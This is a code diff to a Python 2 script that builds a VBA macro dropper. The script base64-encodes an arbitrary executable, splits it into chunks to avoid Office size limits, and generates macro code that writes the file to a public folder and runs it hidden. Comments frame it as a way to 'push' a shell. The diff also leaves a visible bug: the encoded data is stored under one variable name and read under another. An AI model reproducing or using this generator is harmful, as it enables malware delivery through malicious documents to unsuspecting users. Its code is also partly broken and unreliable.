@@ -3,17 +3,13 @@
 import os, sys
 import argparse
 import re
-
-#if len(sys.args) < 2:
-#	print ""
-
+import zlib, base64
 
 #command line args
 parser = argparse.ArgumentParser(description='Generates the macro payload to drop an encoded executable to disk.')
 parser.add_argument('--exe', dest='exe_name', action='store', default='test.exe')
 parser.add_argument('--out', dest='vb_name', action='store', default='test.vb')
 parser.add_argument('--dest', dest='dest', action='store', default='C:\\Users\\Public\\Downloads\\test.exe')
-#parser.add_argument('--exe', dest='exe_name', action='store', default='test.exe')
 
 args=parser.parse_args()
 if '\\' not in args.dest:
@@ -21,60 +17,42 @@ if '\\' not in args.dest:
 	print "[!]    ex: C:\\temp.exe"
 	sys.exit(1)
 
-
 #OPEN THE FILE
 if os.path.isfile(args.exe_name): todo = open(args.exe_name, 'rb').read()
 else: sys.exit(0)
 
 def formStr(varstr, instr):
  holder = []
-# str1 = '\tDim '+ varstr
  str2 = ''
- str1 = '\r\n\t' + varstr + ' = "' + instr[:54] + '"' 
- for i in xrange(54, len(instr), 48):
- 	holder.append('\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
+ str1 = '\r\n' + varstr + ' = "' + instr[:1007] + '"' 
+ for i in xrange(1007, len(instr), 1001):
+ 	holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+1001])
  	str2 = '"\r\n'.join(holder)
  
  str2 = str2 + "\""
  str1 = str1 + "\r\n"+str2
  return str1
 
-
 #ENCODE THE FILE
 print "[+] Encoding %d bytes" % (len(todo), )
-b64 = todo.encode("base64")
-print "[+] Encoded data is %d bytes" % (len(b64), )
+b64b = todo.encode("base64")	
+print "[+] Encoded data is %d bytes" % (len(b64b), )
 b64 = b64.replace("\n","")
-### added check for procedure too large error (65235b) + the variable space.  We are going to split in chunks of 50000 to ensure we are under the cap
+
+############
+### added check for procedure too large error (65535b) + the variable space.  We are going to split in chunks of 50000 to ensure we are under the cap
+### VBA/Macro has a limit of 65534 lines as well.  Is this per macro or per procedure? Anyways, we need to push the line max out...
+### so 1001 * 65490ish lines, should give us theoretical max of something around 65M bytes for now. 
+### Should more than enough for any shell anyone is trying to push ;-)
+############
+
 x=50000
 
 strs = [b64[i:i+x] for i in range(0, len(b64), x)]
 
 for j in range(len(strs)):
 	##### Procedure too large error with large executables #####
-	#str = formStr("var1",b64)
 	strs[j] = formStr("var"+str(j),strs[j])
-
-
-
-########################
-# Deprecated
-#####
-#i = 0
-#str = 'Dim var1\n'
-#for line in b64:
-#	line = line.strip("\n")
-#	if i > 0:	
-#		str = str + "var1 = var1 & \"" + line + "\"\n"
-#	else:
-#		str = str +"var1 = \""+ line+"\"\n"	
-#	i=1
-#vb_in.close()
-#f = open("base64_output.vb", "w")
-#f.write(str)
-#f.close()
-#print "[+] VB file completed!"
-########################
 
 top = "Option Explicit\r\n\r\nConst TypeBinary = 1\r\nConst ForReading = 1, ForWriting = 2, ForAppending = 8\r\n"
 
@@ -95,8 +73,6 @@ for l in range (len(strs) ):
 	sub_open = sub_open + "\tDim chunk"+str(l)+" As String\r\n"
 	sub_open = sub_open + "\tchunk"+str(l)+" = var"+str(l)+"()\r\n"
 	sub_open = sub_open + "\tout1 = out1 + chunk"+str(l)+"\r\n"
-
-#sub_open = sub_open + str
 
 sub_open = sub_open + "\r\n\r\n\tDim decode\r\n\tdecode = decodeBase64(out1)\r\n\tDim outFile\r\n\toutFile = \""+args.dest+"\"\r\n\tCall writeBytes(outFile, decode)\r\n\r\n\tDim retVal\r\n\tretVal = Shell(outFile, 0)\r\nEnd Sub"
 
